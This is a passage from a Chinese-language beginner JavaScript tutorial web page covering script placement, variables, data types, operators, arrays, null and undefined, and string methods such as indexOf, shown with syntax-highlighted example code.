的特点</h4><ul><li>可以使用任何文本编辑工具编写，然后使用浏览器就可以执行程序。</li><li>是一种解释型脚本语言：代码不进行预编译，从上往下逐行执行，不需要进行严格的变量声明。</li><li>主要用来向 HTML 页面添加交互行为。</li></ul><h2 id="JavaScript-范例"><a href="#JavaScript-范例" class="headerlink" title="JavaScript 范例"></a>JavaScript 范例</h2><p>新建一个 test.html 文件</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token operator">&lt;</span>html<span class="token operator">></span>    <span class="token operator">&lt;</span>head<span class="token operator">></span>        <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>title<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>body<span class="token operator">></span>        <span class="token operator">&lt;</span>script<span class="token operator">></span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"hello world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过上面的代码，我们可以看出 JavaScript 代码是放在<script> ……</script> 标签里，而包含 JavaScript 代码的 script 标签，我们可以放在 <body> ……</body>标签里，也可以放在<head><meta name="generator" content="Hexo 3.9.0"> ……<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>标签里。比如上述范例也可以这样写：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token operator">&lt;</span>html<span class="token operator">></span>    <span class="token operator">&lt;</span>head<span class="token operator">></span>        <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>title<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>        <span class="token operator">&lt;</span>script<span class="token operator">></span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"hello world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>body<span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果没有什么区别，不同的是执行顺序，简单的来说，放在前面的会先执行。此外，和 CSS 引入相类似，JavaScript 也可以通过外部引入。首先我们需要创建一个扩展名为 .js 的文件，然后在 html 页面中引入它，同样的拿上述范例来修改，我们首先创建一个叫 test.js (名字自己取，但是扩展名一定要是 .js,只有这样才能够识别 JavaScript 代码)的文件，然后在里面写上我们的 JavaScript 代码：</p><pre><code>console.log(&quot;hello world&quot;);</code></pre><p>在 html 文件中写上如下代码：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token operator">&lt;</span>html<span class="token operator">></span>    <span class="token operator">&lt;</span>head<span class="token operator">></span>        <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>title<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>body<span class="token operator">></span>        <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"test.js"</span><span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>值得注意的是 test.js 文件要和你的 html 文件在同一目录下才能用上面的方式引用，否则的话需要使用相对路径还是绝对路径来引入 js 文件，就需要根据实际情况灵活运用了。前两种方式都是直接把 JavaScript 代码放在 HTML 中，在页面加载的同时，那些 JavaScript 的代码就被解析了。而把 JavaScript 代码放在外部文件中，只有在事件被触发，需要该段 JavaScript 代码时，才调用执行。这样做有个好处，当页面比较复杂的时候，把大量的 JavaScript 代码放到外部文件，只有在需要的时候才执行，那么会明显地加快页面加载速度，而且实现结构化分离，也便于我们维护自己的代码，所以建议大家养成外部引入的方式来写我们的 JavaScript 代码。</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h4 id="变量是什么"><a href="#变量是什么" class="headerlink" title="变量是什么"></a>变量是什么</h4><p>在计算机中，数据都存在内存中。而一个变量，就是一个用于存放数值的容器，每个变量存放的数值是可变的，每个变量都有其独有的名字，每个变量都占有一段内存。</p><p>注：变量不是数值本身，变量仅仅是一个用于储存数值的容器。</p><h4 id="声明变量"><a href="#声明变量" class="headerlink" title="声明变量"></a>声明变量</h4><p>通过 var 关键字来声明变量，比如：</p><pre><code>var name = &quot;实验楼&quot;;</code></pre><p>上述代码声明了一个名为 name 的变量，并赋值为“实验楼”，注意此处的等于符号（=）为赋值符号，不是我们传统意义上理解的等号。</p><p>变量的命名规则如下：</p><ul><li>变量名必须以字符或下划线“_”开头，不能以数字开头</li><li>变量可以包含数字、从 A 至 Z 的大小字母</li><li>不能使用 JavaScript 中的关键字做变量名</li><li>变量名不能有空格</li><li>严格区分大小写，比如：name 和 Name 就是两个完全不同的变量。</li></ul><p>另外在 JavaScript 中，变量也可以不作声明，而在使用时再根据数据的类型来确其变量的类型，如：</p><pre><code>x = 50 ;     // 变量 x 为整数</code></pre><h4 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h4><ul><li>Number:你可以在变量中存储数字，不论这些数字是像 10（整数）这样，或者像 3.1415926（浮点数）。</li></ul><pre><code>var x1 = 10;var x2 = 3.1415926;</code></pre><ul><li>String:存储字符（比如 “shiyanlou”）的变量，字符串可以是引号中的任意文本，你可以使用单引号或双引号，也可以在字符串中使用引号，只要不匹配包围字符串的引号即可：</li></ul><pre><code>var carname=&quot;shiyanlou&quot;;var carname=&#39;shiyanlou&#39;;var answer=&quot;I Love &#39;shiyanlou&#39;&quot;;var answer=&#39;I Love &quot;shiyanlou&quot;&#39;;</code></pre><ul><li>Boolean:布尔类型的值有两种：true 和 false。通常被用于在适当的代码之后，测试条件是否成立，后续会讲到。</li><li>Array：数组是一个单个对象，其中包含很多值，方括号括起来，并用逗号分隔。后续我们将会对数值进行详细的讲解，此处看两个简单的数值例子：</li></ul><pre><code>var myNameArray = [&#39;Tom&#39;, &#39;Bob&#39;, &#39;Jim&#39;];var myNumberArray = [10,15,20];</code></pre><ul><li>Object:对象类型。同样的我们会在后续的课程中详细讲解什么是对象，此处先看一个简单的例子：</li></ul><pre><code>var student = { name : &#39;Tom&#39;, age : 18 };</code></pre><h4 id="动态类型"><a href="#动态类型" class="headerlink" title="动态类型"></a>动态类型</h4><p>JavaScript 是一种“动态类型语言”，这意味着不同于其他一些语言(如 C、Java)，你不需要指定变量将包含什么数据类型（例如 number 或 string）,通通用 var 关键字声明就是了。比如如果你声明一个变量并给它一个带引号的值，浏览器就会知道它是一个字符串：</p><pre><code>var myString = &#39;Hello&#39;;</code></pre><p>值得注意的是就是引号中是一个数字，它依然是 string 类型的。我们可以在控制台中通过 typeof 函数，来查看我们声明的变量是什么类型的。</p><p><img src="http://q85n97zux.bkt.clouddn.com/1565971344000.png" alt></p><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>单行注释：用来描述下面一个或多行代码的作用。单行注释快捷键：Ctrl + /</p><pre><code>//这是一个变量var name = &quot;zhangsan&quot;;</code></pre><p>多行注释：用来注释多条代码。多行注释快捷键：Ctrl + Shift + /</p><pre><code>/*var name = &quot;zhangsan&quot;;var age = 18;console.log(name, age);*/</code></pre><h2 id="数字与运算符"><a href="#数字与运算符" class="headerlink" title="数字与运算符"></a>数字与运算符</h2><h4 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h4><ul><li>整数。例如：1,2,100，-10。</li><li>浮点数:就是小数。例如：0.2，3.1415926。</li><li>双精度：是一种特定类型的浮点数，它们具有比标准浮点数更高的精度。</li></ul><p>注：我们这里作为了解就可以了。因为和其他语言不同的是，在 JavaScript 中，不管什么数字类型的通通用 var 声明就可以了，而且 JavaScript 中只有一个数据类型:Number。</p><h4 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h4><p><img src="http://q85n97zux.bkt.clouddn.com/1566899363039.png" alt></p><p>加减乘除的运算和我们平时所用的差不多，大家可以自行在控制台中尝试。这里需要提醒大家的是累加运算和累减运算的用法:</p><p><img src="http://q85n97zux.bkt.clouddn.com/1566899404800.png" alt="img"></p><p>从上述的图片中可以看出我们不能将这些直接应用于一个数字，不是对值进行操作，而是为变量赋值一个新的更新值。num++ 其实是 num = num + 1 的省略写法。从图片上来看可能不好理解 num++ 和 ++num 的区别。我们来写一个例子：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> num1 <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">var</span> result1 <span class="token operator">=</span> num1<span class="token operator">++</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result1<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>num1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> num2 <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token keyword">var</span> result2 <span class="token operator">=</span> <span class="token operator">++</span>num2<span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result2<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>num2<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后控制台打印的数字为：3 4 5 5。这里我们也可以看出 num++ 和 ++num 的区别，前者是先赋值再自增，后者是先自增再赋值。同样的 num– 和 –num 也是一样的效果，大家可以自行尝试一下。</p><h4 id="操作运算符"><a href="#操作运算符" class="headerlink" title="操作运算符"></a>操作运算符</h4><p><img src="http://q85n97zux.bkt.clouddn.com/1566899435300.png" alt></p><h4 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h4><p><img src="http://q85n97zux.bkt.clouddn.com/1566901057367.png" alt></p><p>在控制台中输入这些示例，如果成立的话会返回 true 如果不成立的话则返回 false。</p><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><p><img src="http://q85n97zux.bkt.clouddn.com/1566900052814.png" alt></p><h4 id="运算符的优先级"><a href="#运算符的优先级" class="headerlink" title="运算符的优先级"></a>运算符的优先级</h4><p><img src="http://q85n97zux.bkt.clouddn.com/1566901074842.png" alt></p><h2 id="数组（概述，方法）"><a href="#数组（概述，方法）" class="headerlink" title="数组（概述，方法）"></a>数组（概述，方法）</h2><p>数组是多数编程语言都具有的数据类型，JavaScript 也不例外，接下来让我们一起来学习 JavaScript 数组的定义和相关操作。</p><h3 id="数组概述"><a href="#数组概述" class="headerlink" title="数组概述"></a>数组概述</h3><p>通过我们前面所学的我们可以知道如果我们要保存一个数据，我们可以用 var 关键字去定义一个变量，但是如果数据很多呢？难道我需要一个个去定义？比如一个班上很多人，我们 var name1 = “张三”;var name2 = “李四”;…一直这样定义下去？显然这是不科学的，而这也由此引出了我们的数组。首先我们来看看维基百科对于数组的定义：</p><blockquote><p>在计算机科学中，数组数据结构（英语：array data structure），简称数组（英语：Array），是由相同类型的元素（element）的集合所组成的数据结构，分配一块连续的内存来存储。利用元素的索引（index）可以计算出该元素对应的存储地址。</p></blockquote><p>最简单的数据结构类型是一维数组。例如，索引为 0 到 9 的 32 位整数数组，可作为在存储器地址2000，2004，2008，…2036中，存储10个变量，因此索引为 i 的元素即在存储器中的 2000+4×i 地址。数组第一个元素的存储器地址称为第一地址或基础地址。</p><h4 id="数组语法"><a href="#数组语法" class="headerlink" title="数组语法"></a>数组语法</h4><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> myarray <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 创建数组同时赋值</span><span class="token comment" spellcheck="true">//or</span><span class="token keyword">var</span> myarray <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//直接输入一个数组（称 “字面量数组”）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：我们可以用上述两种方法创建数组，myarray 指的是定义的数组名，可以自己取，数组储存的的数据可以是任何类型（数字，字符，布尔值等）。每一个值都有一个索引值，从 0 开始。比如：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> color <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"red"</span><span class="token punctuation">,</span><span class="token string">"green"</span><span class="token punctuation">,</span><span class="token string">"blue"</span><span class="token punctuation">,</span><span class="token string">"yellow"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>color<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns "red"</span>color<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns "green"</span>color<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns "blue"</span>color<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns "yellow"</span>color<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns undefined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h4><p>多维数组就是数组中还包含数组，我们可以一层一层的来看。比如：</p><pre><code>var student = [[&quot;张三&quot;,&quot;男&quot;,&quot;18&quot;],[&quot;李四&quot;,&quot;女&quot;,&quot;20&quot;]];student[0][2]; // returns &quot;18&quot;</code></pre><h3 id="操作数组"><a href="#操作数组" class="headerlink" title="操作数组"></a>操作数组</h3><h4 id="修改数组"><a href="#修改数组" class="headerlink" title="修改数组"></a>修改数组</h4><p>修改数组中的元素内容也很简单，直接为它提供新值就可以了。比如：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> color <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"red"</span><span class="token punctuation">,</span><span class="token string">"green"</span><span class="token punctuation">,</span><span class="token string">"blue"</span><span class="token punctuation">,</span><span class="token string">"yellow"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>color<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"black"</span><span class="token punctuation">;</span>color<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns  ["black", "green", "blue", "yellow"]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="获取数组长度"><a href="#获取数组长度" class="headerlink" title="获取数组长度"></a>获取数组长度</h4><p>同样的我们使用 length 来获取数组的长度。比如：</p><pre><code>var color = [&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;,&quot;yellow&quot;];color.length; // returns 4</code></pre><h4 id="数组和字符串之间的转换"><a href="#数组和字符串之间的转换" class="headerlink" title="数组和字符串之间的转换"></a>数组和字符串之间的转换</h4><p>通过 split() 方法，将字符串转换为数组。比如：</p><pre><code>&quot;1:2:3:4&quot;.split(&quot;:&quot;)    // returns [&quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;]&quot;|a|b|c&quot;.split(&quot;|&quot;)    // returns [&quot;&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</code></pre><p>相反的我们通过 join() 方法将数组转换为字符串。比如：</p><pre><code>[&quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;].join(&quot;:&quot;); // returns &quot;1:2:3:4&quot;[&quot;&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;].join(&quot;|&quot;); // returns &quot;|a|b|c&quot;</code></pre><p>注：我们同样可以使用 toString() 方法将数组转换为字符串，但是 join() 方法可以指定不同的分隔符，而 toString() 方法只能是逗号。</p><h4 id="添加和删除数组项"><a href="#添加和删除数组项" class="headerlink" title="添加和删除数组项"></a>添加和删除数组项</h4><p>在数组尾部添加一个或多个元素，使用 push() 方法。比如：</p><pre><code>var arr = [&quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;];arr.push(&quot;5&quot;,&quot;6&quot;);arr; // returns [&quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;]</code></pre><p>使用 pop() 方法将删除数组的最后一个元素，把数组长度减 1，并且返回它删除的元素的值。如果数组已经为空，则 pop() 不改变数组，然后返回 undefined 值。比如：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//returns 4</span>arr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns ["1", "2", "3"]</span><span class="token keyword">var</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr1<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//returns undefined</span>arr1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//returns []</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>unshift() 和 shift() 从功能上与 push() 和 pop() 完全相同，只是它们分别作用于数组的开始，而不是结尾。大家可以直接在控制台自行尝试一番。</p><h2 id="Null-和-Undefined"><a href="#Null-和-Undefined" class="headerlink" title="Null 和 Undefined"></a>Null 和 Undefined</h2><p>null 和 undefined 都表示无,但是也有一些区别。现在控制台上执行以下语句：</p><p><img src="http://q85n97zux.bkt.clouddn.com/1566901102698.png" alt></p><p>这里需要说明的是：== 是相等操作符,比较值是否相等，如果相等输出为 true，否则为 false。=== 是全等操作符,比较值和类型是否都相等，如果都相等输出为 true，否则为 false。通过我们在控制台中的实践可以发现，null 和 undefined 的值不等于 0，它们的值相等，但是类型不相等。undefined 表示所有没有赋值变量的默认值，而 null 则表示一个变量不再指向任何对象地址。</p><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>在前面的变量章节中，我们已经简单讲过字符串的基础知识，这里我们再拓展一下。我们前面讲过我们可以使用单引号或双引号，也可以在字符串中使用引号，只要不匹配包围字符串的引号即可。比如：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> carname<span class="token operator">=</span> <span class="token string">"shiyanlou"</span><span class="token punctuation">;</span><span class="token keyword">var</span> carname<span class="token operator">=</span> <span class="token string">'shiyanlou'</span><span class="token punctuation">;</span><span class="token keyword">var</span> answer<span class="token operator">=</span> <span class="token string">"I Love 'shiyanlou'"</span><span class="token punctuation">;</span><span class="token keyword">var</span> answer<span class="token operator">=</span> <span class="token string">'I Love "shiyanlou"'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>下面的代码将会出现错误，因为它会混淆浏览器和字符串的结束位置:</p><pre><code>var x1 = &#39;I&#39;ve got no right to take my place...&#39;;</code></pre><p>聪明的你可能会觉得这样不行，我们就换种方法嘛，比如：</p><pre><code>var x1 = &#39;I have got no right to take my place...&#39;;</code></pre><p>或者：</p><pre><code>var x1 = &quot;I&#39;ve got no right to take my place...&quot;;</code></pre><p>没错这样做都是可行的方法，但是其实我们还有另外一种方法，使用转义符号。转义字符意味着我们对它们做一些事情，以确保它们在文本中被认可，而不是代码的一部分。在 JavaScript 中，我们通过在字符之前放一个反斜杠来实现这一点。试试这个:</p><pre><code>var x1 = &#39;I\&#39;ve got no right to take my place...&#39;;</code></pre><p>常用的转义符：</p><p><img src="http://q85n97zux.bkt.clouddn.com/1566901117702.png" alt></p><h4 id="连接字符串"><a href="#连接字符串" class="headerlink" title="连接字符串"></a>连接字符串</h4><p>我们通过 “+” 连接字符串，比如在控制台中输入下面的代码：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> one <span class="token operator">=</span> <span class="token string">"Hello,jack."</span><span class="token punctuation">;</span><span class="token keyword">var</span> two <span class="token operator">=</span> <span class="token string">"I'm rose"</span><span class="token punctuation">;</span>result <span class="token operator">=</span> one <span class="token operator">+</span> two<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最后控制台显示结果为：”Hello,jack.I’m rose”。</p><p>如果我们在控制台输入的是 “jack”+18 思考一下会报错吗？要不再自己动手实践看看结果？结果是：浏览器很聪明的把数字转换成了字符串，最后结果为”jack18”。另外输入 “20”+”19”，最后的结果也是字符串”2019”。</p><h4 id="字符串转换"><a href="#字符串转换" class="headerlink" title="字符串转换"></a>字符串转换</h4><p>我们可以通过 toString 方法把数字转换成字符串。</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> myNum <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">var</span> myString <span class="token operator">=</span> myNum<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">typeof</span> myString<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>也可以通过 Number 对象把传递给它的字符串类型的数字转换为数字。</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> myString <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span><span class="token keyword">var</span> myNum <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>myString<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">typeof</span> myNum<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注：如果传递的不是纯数字的字符串，则返回的不是数字，而是 NaN（not a number）。</p><h4 id="获取字符串的长度"><a href="#获取字符串的长度" class="headerlink" title="获取字符串的长度"></a>获取字符串的长度</h4><p>通过 length 属性获取字符串的长度,结果返回一个数字。比如：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> myString <span class="token operator">=</span> <span class="token string">"hello world "</span><span class="token punctuation">;</span>myString<span class="token punctuation">.</span>length<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上述代码在控制台中运行的结果为：12（除了字母还有两个空格）。</p><p>如果你要查找这个字符串的第一个字符，你可以这么做：</p><pre><code>myString[0];</code></pre><p>同样的你也可以查找到其他的字符，比如第五个字符，就是 myString[4]，这是因为电脑是从 0 开始，而不是 1，因此我们都要执行减一操作。</p><h4 id="在字符串中查找子字符串并提取它"><a href="#在字符串中查找子字符串并提取它" class="headerlink" title="在字符串中查找子字符串并提取它"></a>在字符串中查找子字符串并提取它</h4><ol><li>有时候我们需要判断一个较长的字符串里面是否存在一个我们指定的较小的字符串，就比如我们要查找一段话里面是否包含一个词或者一个字，这个时候我们可以使用 indexof() 方法来完成，更详细的语法为：</li></ol><pre><code>str.indexOf(searchValue, fromIndex);</code></pre><p>str 指的是我们需要查的较长的字符串，searchValue 表示我们指定的较小的字符串，fromIndex 表示调用该方法的字符串中开始查找的位置，是一个可选的任意整数值，也可以不写，默认是 0 表示从头开始查，fromIndex &lt; 0 和 fromIndex = 0 是一样的效果，表示从头开始查找整个字符串。如果 fromIndex &gt;= str.length,则该方法的返回值为 -1。这里有个特殊的情况：就是如果被查找的字符串（searchValue）是一个空字符串，那么当 fromIndex &lt;= 0 时返回 0，0 &lt; fromIndex &lt;= str.length 时返回 fromIndex，fromIndex &gt; str.length 时返回 str.length。这样说你可能不太明白，我们来实践一下看看实际效果：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token string">"Blue Sky"</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"Blue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// returns  0</span><span class="token string">"Blue Sky"</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"Ble"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// returns -1</span><span class="token string">"Blue Sky"</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"Sky"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns  5</span><span class="token string">"Blue Sky"</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"Sky"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns  5</span><span class="token string">"Blue Sky"</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"Sky"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns  5</span><span class="token string">"Blue Sky"</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"Sky"</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns -1</span><span class="token string">"Blue Sky"</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// returns  0</span><span class="token string">"Blue Sky"</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// returns 5</span><span class="token string">"Blue Sky"</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// returns 8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：返回值指的是指定值的第一次出现的索引，如果没有找到 -1。indexOf 方法区分大小写，比如：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token string">"Blue Sky"</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"blue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns -1</span><span class="token 